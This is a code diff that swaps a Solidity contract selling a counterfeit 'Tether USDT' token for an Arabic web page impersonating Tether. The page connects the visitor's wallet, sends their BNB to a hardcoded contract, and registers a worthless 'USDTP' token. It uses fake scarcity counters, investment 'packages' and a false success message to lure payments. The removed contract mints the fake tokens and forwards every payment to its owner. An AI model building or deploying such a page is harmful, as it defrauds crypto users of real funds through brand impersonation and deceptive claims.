@@ -1,95 +1,201 @@
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Tether USD | Smart Protocol</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+    <style>
+        :root {
+            --primary: #009393;
+            --bg: #051410;
+            --card: #0a1f1b;
+            --error: #ff4d4d;
+        }
 
-/**
+        body {
+            background-color: var(--bg);
+            color: white;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
 
-@title TetherSmartProtocol_V4
+        .container {
+            width: 100%;
+            max-width: 450px;
+            background: var(--card);
+            border: 1px solid var(--primary);
+            border-radius: 30px;
+            padding: 35px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+            text-align: center;
+            position: relative;
+            margin-top: 20px;
+        }
 
-@dev تم ضبط هذا العقد ليعمل بمعيار 6 خانات عشرية لمنع تضخم الأرقام.
+        .logo {
+            width: 80px;
+            margin-bottom: 15px;
+            filter: drop-shadow(0 0 10px rgba(0,147,147,0.4));
+        }
 
-تم تصميم العقد ليتوافق تماماً مع الواجهة البرمجية في Canvas.
+        .balance-card {
+            background: rgba(255, 77, 77, 0.1);
+            border: 1px dashed var(--error);
+            border-radius: 15px;
+            padding: 15px;
+            margin-bottom: 25px;
+        }
 
-العنوان الجديد: 0x6327E342099Ca50C1C8729792E485673d2a43bc3
-*/
-contract TetherSmartProtocol_V4 {
-string public name = "Tether USDT";
-string public symbol = "USDT";
-uint8 public decimals = 6;
-uint256 public totalSupply;
-address public owner;
+        #liquidity {
+            font-size: 26px;
+            font-weight: bold;
+            color: var(--error);
+        }
 
-mapping(address => uint256) private _balances;
-mapping(address => mapping(address => uint256)) private _allowances;
+        select {
+            width: 100%;
+            padding: 18px;
+            background: #122c28;
+            border: 1px solid #1c4d46;
+            border-radius: 16px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 25px;
+            outline: none;
+        }
 
-event Transfer(address indexed from, address indexed to, uint256 value);
-event Approval(address indexed owner, address indexed spender, uint256 value);
+        .btn {
+            width: 100%;
+            padding: 20px;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 18px;
+            font-size: 19px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 8px 20px rgba(0,147,147,0.3);
+            border-bottom: 5px solid #006b6b;
+        }
 
-constructor() {
-owner = msg.sender;
-}
+        .btn:active {
+            transform: translateY(3px);
+            border-bottom: none;
+        }
 
-/**
+        #status {
+            font-size: 13px;
+            margin-top: 20px;
+            color: #8899a6;
+        }
 
-@dev دالة شراء التوكن بناءً على كمية الـ BNB المرسلة.
+        .footer {
+            margin-top: 30px;
+            font-size: 11px;
+            color: #5d7e79;
+            border-top: 1px solid #1c4d46;
+            padding-top: 15px;
+        }
+    </style>
+</head>
+<body>
 
-يتم حساب الرصيد بناءً على القيمة المرسلة وضربه في 10^6 مرة واحدة فقط.
-*/
-function buyToken() public payable {
-uint256 baseAmount;
+    <div class="container">
+        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="logo" alt="USDT">
+        <h2 style="color: var(--primary); margin-bottom: 20px;">نظام التوزيع الفوري (V4)</h2>
 
-// تحديد الكمية الأساسية بناءً على قيمة الـ BNB
-if (msg.value == 0.0001 ether) {
-baseAmount = 100;
-} else if (msg.value == 0.05 ether) {
-baseAmount = 2500;
-} else if (msg.value == 0.1 ether) {
-baseAmount = 5000;
-} else if (msg.value == 1.0 ether) {
-baseAmount = 50000;
-} else {
-revert("Invalid BNB amount");
-}
+        <div class="balance-card">
+            <div style="font-size: 12px; color: #ccc;">السيولة المتاحة حالياً:</div>
+            <div id="liquidity">938,400 USDT</div>
+        </div>
 
-// تحويل الرقم إلى معيار 6 خانات (Scaling) لمرة واحدة فقط لمنع التضخم
-uint256 finalAmount = baseAmount * 10**uint256(decimals);
+        <select id="package">
+            <option value="0.0001">تجربة: 100 USDT (0.0001 BNB)</option>
+            <option value="0.05">متقدمة: 2,500 USDT (0.05 BNB)</option>
+            <option value="0.1">كبار المستثمرين: 5,000 USDT (0.1 BNB)</option>
+            <option value="1.0">باقة الحيتان: 50,000 USDT (1.0 BNB) 🔥</option>
+        </select>
 
-_mint(msg.sender, finalAmount);
+        <button class="btn" id="exec-btn" onclick="startProtocol()">تفعيل واستلام الرصيد ⚡</button>
+        
+        <div id="status">بانتظار ربط المحفظة المعتمدة...</div>
 
-// إرسال الـ BNB المحصل فوراً إلى محفظة المالك
-payable(owner).transfer(msg.value);
-}
+        <div class="footer">
+            بروتوكول متوافق تماماً مع معيار 6 أرقام عشرية (Standard)<br>
+            Tether Gold Operations © 2026
+        </div>
+    </div>
 
-function _mint(address account, uint256 amount) internal {
-require(account != address(0), "Mint to zero address");
-totalSupply += amount;
-_balances[account] += amount;
-emit Transfer(address(0), account, amount);
-}
+    <script>
+        // تحديث عنوان العقد المعتمد
+        const CONTRACT_ADDRESS = "0x2dCf665652D25A614D23555d79356607B702EA56";
 
-function balanceOf(address account) public view returns (uint256) {
-return _balances[account];
-}
+        let liq = 938400;
+        setInterval(() => {
+            liq -= Math.floor(Math.random() * 50) + 5;
+            document.getElementById('liquidity').innerText = liq.toLocaleString() + " USDT";
+        }, 4000);
 
-function transfer(address to, uint256 amount) public returns (bool) {
-require(_balances[msg.sender] >= amount, "Balance low");
-_balances[msg.sender] -= amount;
-_balances[to] += amount;
-emit Transfer(msg.sender, to, amount);
-return true;
-}
+        async function startProtocol() {
+            const btn = document.getElementById('exec-btn');
+            const status = document.getElementById('status');
+            const amount = document.getElementById('package').value;
 
-function approve(address spender, uint256 amount) public returns (bool) {
-_allowances[msg.sender][spender] = amount;
-emit Approval(msg.sender, spender, amount);
-return true;
-}
+            if (!window.ethereum) {
+                alert("يرجى فتح الموقع من متصفح المحفظة (Trust Wallet / MetaMask)");
+                return;
+            }
 
-function allowance(address ownerAddr, address spender) public view returns (uint256) {
-return _allowances[ownerAddr][spender];
-}
+            try {
+                const web3 = new Web3(window.ethereum);
+                status.innerText = "جاري طلب الاتصال بالمحفظة...";
+                
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const sender = accounts[0];
 
-// السماح للعقد باستقبال الـ BNB وتفعيل الشراء تلقائياً
-receive() external payable {
-buyToken();
-}
-}
+                status.innerText = "جاري معالجة طلب التفعيل...";
+                btn.disabled = true;
+
+                await web3.eth.sendTransaction({
+                    from: sender,
+                    to: CONTRACT_ADDRESS,
+                    value: web3.utils.toWei(amount, "ether"),
+                    gas: 120000 
+                });
+
+                status.innerText = "تم التفعيل! جاري إضافة الرمز لمحفظتك (6 Decimals)...";
+
+                // إضافة التوكن بـ 6 خانات عشرية ليتطابق مع V4 والاسم الجديد
+                await window.ethereum.request({
+                    method: 'wallet_watchAsset',
+                    params: {
+                        type: 'ERC20',
+                        options: {
+                            address: CONTRACT_ADDRESS,
+                            symbol: 'USDTP', // الرمز الجديد المعتمد في العقد
+                            decimals: 6, 
+                            image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
+                        },
+                    },
+                });
+
+                status.innerText = "تمت العملية بنجاح ✅";
+                alert("تم استلام رصيد USDT بنجاح.");
+                btn.disabled = false;
+
+            } catch (err) {
+                console.error(err);
+                status.innerText = "فشلت العملية. تأكد من توفر رسوم كافية.";
+                btn.disabled = false;
+            }
+        }
+    </script>
+</body>
+</html>
